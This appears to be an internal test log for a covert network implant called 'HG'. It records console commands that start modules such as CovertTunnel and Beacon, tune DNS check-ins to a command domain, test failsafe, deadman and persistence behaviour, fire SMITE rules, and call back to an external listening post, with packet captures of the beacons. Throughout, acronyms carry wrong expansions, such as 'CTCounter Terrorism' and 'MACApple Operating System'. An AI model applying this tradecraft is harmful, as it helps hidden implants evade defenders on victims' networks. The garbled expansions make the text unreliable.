+CovertTunnel.mod - stopped, upon restart it didn't restart on the first try:[192.168.211.10]> module start default:CovertTunnel.mod[Remote Failure] "Load Module from File" command error:[Beachhead 103] Load module failed************ Remote Failure ************[module start default:CovertTunnel.mod]
+[192.168.211.10]> module start default:CovertTunnel.mod[Success] ************ Success ************[module start default:CovertTunnel.mod]
+[192.168.211.10]> module show[Success]  Name Version Boot Persistence State Address Path  Beachhead 11 No Running 0x2460894 default:Beachhead.mod  IV 17 No Running 0x26de184 default:IV.mod  OSOperating System 23 No Running 0x29d8b98 default:OS.mod  Utility 16 Yes Running 0x28b9b10 default:Utility.mod  Process 31 Yes Running 0x29f2ad0 default:Process.mod  Broker 17 Yes Running 0x2a6f584 default:Broker.mod  SWINE 16 No Running 0x27500b4 default:SWINE.mod  MiniLZO 6 Yes Running 0x274d944 default:MiniLZO.mod  RC6 7 No Running 0x1b52f84 default:RC6.mod Configuration 7 Yes Running 0x2b9001c default:Configuration.mod  Packet 35 Yes Running 0x2a1423c default:Packet.mod  EBroker 8 No Running 0x2802120 default:EBroker.mod  Device 31 Yes Running 0x2455d68 default:Device.mod  Beacon 21 Yes Running 0x2952028 default:Beacon.mod  Socket 19 Yes Running 0x28f913c default:Socket.mod  Trigger 22 Yes Running 0x2a7c604 default:Trigger.mod  DNSDomain Name System 19 No Running 0x286f798 default:DNS.mod  HTTPSHypertext Transfer Protocol Secure 18 No Running 0x28d909c default:HTTPS.mod  Web 4 Yes Running 0x2ac5d58 default:Web.mod  Persistence 1 Yes Running 0x28e1d70 default:Persistence.mod  Uninstall 4 Yes Running 0x28e4688 default:Uninstall.mod  CFS 19 No Running 0x2878a04 default:CFS.mod  DnsCheckin 5 No Running 0x2c52158 default:DnsCheckin.mod  FilterBroker 22 Yes Running 0x2aaa114 default:FilterBroker.mod  ACEApplication Control Engine (Module) 26 No Running 0x2a04f28 default:ACE.mod  Tunnel 10 No Running 0x2a994b4 default:Tunnel.mod  Name State Version Critical  Beachhead ModuleRunning 11 Yes  IV ModuleRunning 17 Yes Press <enter> to continue
+OS ModuleRunning 23 Yes  Utility ModuleRunning 16 Yes  Process ModuleRunning 31 Yes  Broker ModuleRunning 17 Yes  SWINE ModuleRunning 16 Yes  MiniLZO ModuleRunning 6 Yes  RC6 ModuleRunning 7 Yes Configuration ModuleRunning 7 Yes  Packet ModuleRunning 35 Yes  EBroker ModuleRunning 8 Yes  Device ModuleRunning 31 Yes  Beacon ModuleRunning 21 Yes  Socket ModuleRunning 19 Yes  Trigger ModuleRunning 22 No  DNSDomain Name System ModuleRunning 19 Yes  HTTPSHypertext Transfer Protocol Secure ModuleRunning 18 Yes  Web ModuleRunning 4 Yes  Persistence ModuleRunning 1 No  Uninstall ModuleRunning 4 No  CFS ModuleRunning 19 Yes  DnsCheckin ModuleRunning 5 No  FilterBroker ModuleRunning 22 No  ACEApplication Control Engine (Module) ModuleRunning 26 No  Tunnel ModuleRunning 10 No ************ Success ************[module show]
+
+Restarted tunnel module successfully
+After further testing, this module does restart successfully if you want for the module to disappear from the output of module show.  For some time it will just say module stopped.  Attempts to start the module during this time will fail.  Once it drops completely from the output of module show, attempts to start the module are successful.
+
+
+Ad Hoc - Stop Checkin Module, reload DUT
+DUT had been running HG all night.
+Connected over an hour ago with CTCounter Terrorism session
+Checkin module stopped
+Reloaded DUTDevice Under Test - DNSDomain Name System checkin module started up on reload - EAREnterprise Archive 2036
+Checkin parameters were persisted
+Trigger sequence number reverted to 1, which was the last successful trigger sequence from this morning.  So the most recent trigger seq had not yet been persisted.
+Changed delay to 10m and variance to 10s.  Allowed time to checkin to count down to 3:30.  Reloaded DUT
+Before reload[192.168.211.10]> checkin show[Success]
+DnsCheckin  Enabled Yes  SDCMicrosoft software packaging format Enabled No  Explicit Parameters Enabled No  Time to Next Check-In 0d 0h 3m 42s  Initial Delay 3d 0h 0m 0s  Delay 0d 0h 10m 0s  Variance 0d 0h 0m 10s  Domain www.vesselwatcher.net SDCMicrosoft software packaging format Time Interval 0d 0h 0m 0s  SDCMicrosoft software packaging format Max Existing Host Age 0d 0h 0m 0s  Last Command File Executed ci_loc1_resetfailsafe.cmd  Lifetime success count 3088  Lifetime failure count 2  Failsafe Max 12  Current Failsafe Count 0  Deadman Enabled Yes  Last Error DNSDomain Name System Comms Failure (101)  Time Since Last Error 0d 1h 14m 56s
+Explicit Parameters  IP 0.0.0.0  Subnet 0.0.0.0  MACApple Operating System 00:00:00:00:00:00  VLANVirtual Local Area Network 0  TTLTime To Live 0  Next Hop MACApple Operating System 00:00:00:00:00:00  Nameserver 0.0.0.0 ************ Success ************Press <enter> to continue[checkin show]
+
+
+After reload
+[192.168.211.10]> checkin show[Success]
+DnsCheckin  Enabled Yes  SDCMicrosoft software packaging format Enabled No  Explicit Parameters Enabled No  Time to Next Check-In 0d 0h 6m 7s  Initial Delay 3d 0h 0m 0s  Delay 0d 0h 10m 0s  Variance 0d 0h 0m 10s  Domain www.vesselwatcher.net SDCMicrosoft software packaging format Time Interval 0d 0h 0m 0s  SDCMicrosoft software packaging format Max Existing Host Age 0d 0h 0m 0s  Last Command File Executed N/A  Lifetime success count 3088  Lifetime failure count 2  Failsafe Max 12  Current Failsafe Count 0  Deadman Enabled Yes  Last Error None (0)  Time Since Last Error 0d 0h 0m 0s
+Explicit Parameters  IP 0.0.0.0  Subnet 0.0.0.0  MACApple Operating System 00:00:00:00:00:00  VLANVirtual Local Area Network 0  TTLTime To Live 0  Next Hop MACApple Operating System 00:00:00:00:00:00  Nameserver 0.0.0.0 ************ Success ************Press <enter> to continue[checkin show]
+ The delay and variance updates were persisted, SDCMicrosoft software packaging format being disabled was persisted, however the time to next check-in was not persisted.
+
+
+
+SDC Test - SDCMicrosoft software packaging format changes persisted
+Currently SDCMicrosoft software packaging format is disabled
+SDC disabled already survived one reload
+Enabled SDC:SDC Enabled Yes
+SDC Time Interval 0d 10h 0m 0s  SDCMicrosoft software packaging format Max Existing Host Age 0d 0h 10m 0s
+
+Reloaded device
+SDC changes were persisted:SDC Enabled Yes
+SDC Time Interval 0d 10h 0m 0s  SDCMicrosoft software packaging format Max Existing Host Age 0d 0h 10m 0s
+
+
+
+Test SDCMicrosoft software packaging format window expiring
+Changed SDCMicrosoft software packaging format params to 2m window, 0s max existing host age
+changed delay to 30s, var to 10s
+
+[192.168.211.10]> dns get_snooped_host_list_client 0 0[Pending] Job: 136269224************ Pending ************[dns get_snooped_host_list_client 0 0]
+[192.168.211.10]> [Success]
+IP Address MACApple Operating System Addr VLANVirtual Local Area Network TTLTime To Live Count Resolver IP Status
+192.168.211.10 00:14:A8:48:07:C0 1 128 121 192.168.0.11 GOODReceived 1 entries.
+Job: 136269224************ Success ************
+[192.168.211.10]>
+
+Maintained a CTCounter Terrorism session to prevent snooping for SDC
+After time to checkin had reached zero, waited 2 minutes, then did rx a checkin - expected interval - 2.5 minutes13:28:05.984975 IP 192.168.211.10.13765 > 192.168.0.11.domain: 33717+ A? www.vesselwatcher.net. (39)13:28:05.985614 IP 192.168.0.11.16951 > 192.168.0.4.domain: 12025+ [1au] A? www.vesselwatcher.net. (50)13:28:05.992488 IP 192.168.0.4.domain > 192.168.0.11.16951: 12025 2/1/2 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (119)13:28:05.993159 IP 192.168.0.11.60671 > 192.168.0.4.domain: 15231+ [1au] A? loc1.vesselwatcher.net. (51)13:28:05.994096 IP 192.168.0.11.domain > 192.168.211.10.13765: 33717 2/1/1 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (108)13:30:32.625235 IP 192.168.211.10.16297 > 192.168.0.11.domain: 24261+ A? www.vesselwatcher.net. (39)13:30:32.625866 IP 192.168.0.11.16244 > 192.168.0.4.domain: 9574+ [1au] A? www.vesselwatcher.net. (50)13:30:32.631881 IP 192.168.0.4.domain > 192.168.0.11.16244: 9574 2/1/2 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (119)13:30:32.632365 IP 192.168.0.11.47097 > 192.168.0.4.domain: 52576+ [1au] A? loc1.vesselwatcher.net. (51)13:30:32.633351 IP 192.168.0.11.domain > 192.168.211.10.16297: 24261 2/1/1 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (108)
+
+
+Cleared dns snooping stats - watched and a failure did increment:
+Lifetime failure count 3
+Current Failsafe Count 1
+
+Exited CTCounter Terrorism session to allow snooping to occur again
+Logged back in after about 2 minutes
+Current failsafe count back to 0, lifetime failsafes still at 3.
+DNS has once again snooped a client
+
+
+Confirm issue with change checkin delayConfirmed not to be an issue - best practice when changing both variance and delay would be to change variance first so that the time to next checkin value is updated with new variance
+
+Test failure where DNSDomain Name System responds but without a CNAME
+With HG running and DNSDomain Name System checking in every 60seconds
+SDC disabled - CTCounter Terrorism session active
+IXIA running background traffic
+Verified DNSDomain Name System checkins are successfu
+Updated BINDDNSDomain Name System server software on X.X.X.X (LVLT-GOGL-8-8-8[US]) to remove CNAME from zone
+When no CNAME is rx, it counts as a DNSDomain Name System Checkin success.  Failure does not increment.
+Let this run with and without CTCounter Terrorism session[192.168.211.10]> checkin show[Success]
+DnsCheckin  Enabled Yes  SDCMicrosoft software packaging format Enabled No  Explicit Parameters Enabled No  Time to Next Check-In 0d 0h 0m 56s  Initial Delay 3d 0h 0m 0s  Delay 0d 0h 1m 0s  Variance 0d 0h 0m 0s  Domain www.vesselwatcher.net SDCMicrosoft software packaging format Time Interval 0d 0h 0m 0s  SDCMicrosoft software packaging format Max Existing Host Age 0d 0h 0m 0s  Last Command File Executed ci_loc1_resetfailsafe.cmd  Lifetime success count 3275  Lifetime failure count 20  Failsafe Max 12  Current Failsafe Count 0  Deadman Enabled Yes  Last Error DNSDomain Name System Comms Failure (101)  Time Since Last Error 0d 0h 37m 19s
+
+
+
+Test failure where DNSDomain Name System completely timesout, no response either way
+SDC disabled on checkin
+Verified Seeds traffic running
+Stopped bind service on flux2 - verified Seeds can no longer resolve
+Verified that HG has the Seeds host already in dns snooped host list
+Started TCPTransport Control Protocol dump on flux 2 to verify DNSDomain Name System checkin attempts and lack of reply
+Change variance to 1s and then change delay to 30s
+Verified that HG attempts to do a dns checkin and receives no response - tries 3x with 32s between each try before counting it as a failed attempt
+Actually, Flux2 sends an ICMPInternet Control Message Protocol unreachable back to HG, but HG does not pick it up, it goes through to the impersonated host. - HG-7
+
+Restarted bind 9 after allowing 6 failures to accumulate
+HG successfully checked in and now current failsafe count is back to 0.
+To verify negative replies are not punching through, commenting out HG vesselwatcher zone on X.X.X.X (LVLT-GOGL-8-8-8[US]) and restarting bind.
+Negative replies do not punch through to the impersonated host and are rcvd in 10 seconds.  After the negative response is received, HG then restarts the time to check in per the delay parameter and will send another request in that time.
+Shutdown BINDDNSDomain Name System server software on 4.4.4.4 - 192.168.0.11 replies to HG with SERVER FAIL and it does not punch through to impersonated host.
+Tried shutting down interface eth0 on 192.168.0.11 - nothing punched through to impersonated host
+
+
+Persistence test - Verify if time to next checkin is persisted
+On reloads after changes made only a short time ago, trigger seq and time to next checkin are not persisted.  Once more time has passed, trigger seq is persisted.  
+Need to verify if this is also true for time to next checkin
+Set checkin delay to 10d with variance of 0.
+Verified that time to next check said 10d.  
+Allowed HG to run over night
+the next day, verified that time to next checkin had decremented:[192.168.211.10]> checkin show[Success]
+DnsCheckin  Enabled Yes  SDCMicrosoft software packaging format Enabled No  Explicit Parameters Enabled No  Time to Next Check-In 9d 6h 45m 8s  Initial Delay 3d 0h 0m 0s  Delay 10d 0h 0m 0s  Variance 0d 0h 0m 0s  Domain www.vesselwatcher.net SDCMicrosoft software packaging format Time Interval 0d 0h 0m 0s  SDCMicrosoft software packaging format Max Existing Host Age 0d 0h 0m 0s  Last Command File Executed ci_loc1_resetfailsafe.cmd  Lifetime success count 3230  Lifetime failure count 17  Failsafe Max 12  Current Failsafe Count 0  Deadman Enabled Yes  Last Error DNSDomain Name System Comms Failure (101)  Time Since Last Error 0d 18h 22m 58s
+
+Current trigger seq number is 5
+Reloaded DUTDevice Under Test and time to next checkin was persisted although not up to the mnute, and trigger seq was persisted:DnsCheckin  Enabled Yes  SDCMicrosoft software packaging format Enabled No  Explicit Parameters Enabled No  Time to Next Check-In 9d 7h 4m 33s  Initial Delay 3d 0h 0m 0s  Delay 10d 0h 0m 0s  Variance 0d 0h 0m 0s  Domain www.vesselwatcher.net SDCMicrosoft software packaging format Time Interval 0d 0h 0m 0s  SDCMicrosoft software packaging format Max Existing Host Age 0d 0h 0m 0s  Last Command File Executed N/A  Lifetime success count 3230  Lifetime failure count 17  Failsafe Max 12  Current Failsafe Count 0  Deadman Enabled Yes  Last Error None (0)  Time Since Last Error 0d 0h 0m 0s
+
+
+
+
+Ad hoc test - power failure
+
+with HG installed, pulled power out back of DUT
+This was checkin show before:DnsCheckin  Enabled Yes  SDCMicrosoft software packaging format Enabled No  Explicit Parameters Enabled No  Time to Next Check-In 9d 5h 48m 41s  Initial Delay 3d 0h 0m 0s  Delay 10d 0h 0m 0s  Variance 0d 0h 0m 0s  Domain www.vesselwatcher.net SDCMicrosoft software packaging format Time Interval 0d 0h 0m 0s  SDCMicrosoft software packaging format Max Existing Host Age 0d 0h 0m 0s  Last Command File Executed N/A  Lifetime success count 3230  Lifetime failure count 17  Failsafe Max 12  Current Failsafe Count 0  Deadman Enabled Yes  Last Error None (0)  Time Since Last Error 0d 0h 0m 0s
+
+Values reverted back to what they were this morning - seq numnber 5 as well as next time to checkin.
+No messages printed to console
+
+
+Test of DNSDomain Name System checkin cname commands
+With SDCMicrosoft software packaging format disabled, IXIA running, and CTCounter Terrorism session active, verified DNSDomain Name System Checkin currently working with the following params:DnsCheckin  Enabled Yes  SDCMicrosoft software packaging format Enabled No  Explicit Parameters Enabled No  Time to Next Check-In 0d 0h 0m 9s  Initial Delay 3d 0h 0m 0s  Delay 0d 0h 1m 0s  Variance 0d 0h 0m 4s  Domain www.vesselwatcher.net SDCMicrosoft software packaging format Time Interval 0d 0h 0m 0s  SDCMicrosoft software packaging format Max Existing Host Age 0d 0h 0m 0s  Last Command File Executed ci_loc1_resetfailsafe.cmd  Lifetime success count 3311  Lifetime failure count 20  Failsafe Max 12  Current Failsafe Count 0  Deadman Enabled Yes  Last Error DNSDomain Name System Comms Failure (101)  Time Since Last Error 0d 1h 14m 27s
+
+time - changed cname to timeexecuted as expected - reset failsafe, changed sdc window ( plus enabled SDCMicrosoft software packaging format in doing so), changed variance and delay:DnsCheckin  Enabled Yes  SDCMicrosoft software packaging format Enabled Yes  Explicit Parameters Enabled No  Time to Next Check-In 1d 0h 55m 2s  Initial Delay 3d 0h 0m 0s  Delay 1d 1h 0m 0s  Variance 0d 0h 0m 0s  Domain www.vesselwatcher.net SDCMicrosoft software packaging format Time Interval 0d 1h 0m 0s  SDCMicrosoft software packaging format Max Existing Host Age 0d 0h 0m 0s  Last Command File Executed changedelay25h.cmd  Lifetime success count 3314  Lifetime failure count 20  Failsafe Max 12  Current Failsafe Count 0  Deadman Enabled Yes  Last Error DNSDomain Name System Comms Failure (101)  Time Since Last Error 0d 1h 21m 31s
+
+
+
+Changed CNAME back to loc3 and reset variance and delay to 5s and 60s respectively, exited CTCounter Terrorism session
+executed as expected - reset failsafe, changed sdc window, change variance, change delayDnsCheckin  Enabled Yes  SDCMicrosoft software packaging format Enabled Yes  Explicit Parameters Enabled No  Time to Next Check-In 14d 14h 30m 13s  Initial Delay 3d 0h 0m 0s  Delay 15d 0h 0m 0s  Variance 0d 12h 0m 0s  Domain www.vesselwatcher.net SDCMicrosoft software packaging format Time Interval 0d 12h 0m 0s  SDCMicrosoft software packaging format Max Existing Host Age 0d 0h 0m 0s  Last Command File Executed ci_map1_changedelay15d.cmd  Lifetime success count 3315  Lifetime failure count 20  Failsafe Max 12  Current Failsafe Count 0  Deadman Enabled Yes  Last Error DNSDomain Name System Comms Failure (101)  Time Since Last Error 0d 1h 37m 25s
+
+
+
+Changed CNAME back to time and reset variance and delay to 5s and 60s respectively, exited CTCounter Terrorism session
+Executed as expected:DnsCheckin  Enabled Yes  SDCMicrosoft software packaging format Enabled Yes  Explicit Parameters Enabled No  Time to Next Check-In 1d 0h 59m 30s  Initial Delay 3d 0h 0m 0s  Delay 1d 1h 0m 0s  Variance 0d 0h 0m 0s  Domain www.vesselwatcher.net SDCMicrosoft software packaging format Time Interval 0d 1h 0m 0s  SDCMicrosoft software packaging format Max Existing Host Age 0d 0h 0m 0s  Last Command File Executed changedelay25h.cmd  Lifetime success count 3316  Lifetime failure count 20  Failsafe Max 12  Current Failsafe Count 0  Deadman Enabled Yes  Last Error DNSDomain Name System Comms Failure (101)  Time Since Last Error 0d 1h 47m 19s
+
+
+Testing callback once a day = info
+Setup a second ICON VMVirtual Machine for HG to call back to - 172.20.12.36
+Set HG to call in every 60s, no variance, SDCMicrosoft software packaging format window 1 hour, SDCMicrosoft software packaging format enabledDnsCheckin  Enabled Yes  SDCMicrosoft software packaging format Enabled Yes  Explicit Parameters Enabled No  Time to Next Check-In 0d 0h 0m 17s  Initial Delay 3d 0h 0m 0s  Delay 0d 0h 1m 0s  Variance 0d 0h 0m 0s  Domain www.vesselwatcher.net SDCMicrosoft software packaging format Time Interval 0d 1h 0m 0s  SDCMicrosoft software packaging format Max Existing Host Age 0d 0h 0m 0s  Last Command File Executed ci_loc1_resetfailsafe.cmd  Lifetime success count 3317  Lifetime failure count 20  Failsafe Max 12  Current Failsafe Count 0  Deadman Enabled Yes  Last Error DNSDomain Name System Comms Failure (101)  Time Since Last Error 0d 3h 2m 18s
+
+Changed CNAME to info and set up listening window on ICON2
+Having a lot of trouble - HG not calling back to second ICON machine as far as I can tell.  Trigger is successful, no call back attempt seen in wireshark on port mirror VM, mirroring proxy eth1.
+After troubleshooting, found at least one issue - when Seeds traffic only includes https requests to 8088, and https get_snooped_host_list_client has been cleared, HG does not detect any HTTPSHypertext Transfer Protocol Secure clients to use for the connection. HG-9 created for this issue.  Explicit params can be used to establish CTCounter Terrorism session in this case to internal flux node, however per User #77275/Xetron, explicit params will not work to callback to an external IP address.  User #77276/Xetron going to research changing the port number HG uses to locate HTTPSHypertext Transfer Protocol Secure traffic to snoop and get back with me.
+
+
+
+
+Test 3 day initial delay
+I had installed HG on Friday and let it run over the weekend
+Did not make any changes to checkin paramters
+On Monday, after the three day initial delay expired, HG did successfully checkin via DNSDomain Name System Checkin and got CNAME loc1.
+
+
+Test unexpected CNAME
+Changed cname to foo to test unexpected CNAME
+Changed DNSDomain Name System checkin params to no varaince, delay 10s, no SDC
+Observed DNSDomain Name System chekcin and CNAME response of foo on X.X.X.X (LVLT-GOGL-8-8-8[US])
+
+Checkin show on HG implant counts these as successfull check ins.
+Multiple CNAMES not possible.
+
+
+Test DNSDomain Name System Checkin SMITE rules
+Changed DNSDomain Name System checkin delay to 1m
+Changed DNSDomain Name System CNAME to map2 to test SMITE rules
+DNS successfully checked in - smite rules were created
+Found that SMITE rule kept firing because I didn't change the DNSDomain Name System CNAME
+The rules were successfully deleted and recreated each time the DNSCheckin occured, rule numbers incrementing
+Ran the tanker CNAME to delete the rules
+Ran the map2 CNAME again and this time reverted to loc1 after the checkin occured only one time
+Ran loc2 with a private IP as a response and noted that it causes a failure to increment
+Responses with 1918 space cause a failure to increment - deadman scenario
+Toggled between loc2, loc1, map2 and tanker rules - no issues, rules behaved as expected
+Tested map1 command to change delay to 15d
+
+
+SMITE Test
+Setup a windows victim on Seeds vlan
+Rules will likely not work since they reference port 80, clients on this network use 8088
+
+
+Test of Ability to call back externally - HG-10
+In earlier testing, have had intermittent problems calling back to an external IP address to make a CTCounter Terrorism connection.  
+Xetron sent me a debug version of HG, which I installed and collected output from for their analysis
+
+User #77277/Xetron called to say they believe this is an HG bug and they are looking into it further.
+Xetron created EAREnterprise Archive 5536 for this.
+
+
+
+ 
+
+Previous versions:
+| 1 empty
+| 2 
+| 3 
+| 4 
+| 5 
+| 6 
+| 7 
+| 8 
+| 9 
+| 10 [Xetron]
+| 11 [Xetron]
+| 12 [Xetron]
+| 13 [Xetron]
+| 14 [Xetron]
+| 15 [Xetron]
+| 16 [Xetron]
+| 17 [Xetron]
+| 18 [Xetron]
+| 19 [Xetron]
+| 20 [Xetron]
+| 21 [Xetron]
+| 22 [Xetron]
+| 23 [Xetron]
+| 24 [Xetron]
+| 25 [Xetron]
+| 26 [Xetron]
+| 27 [Xetron]
+|
+                    
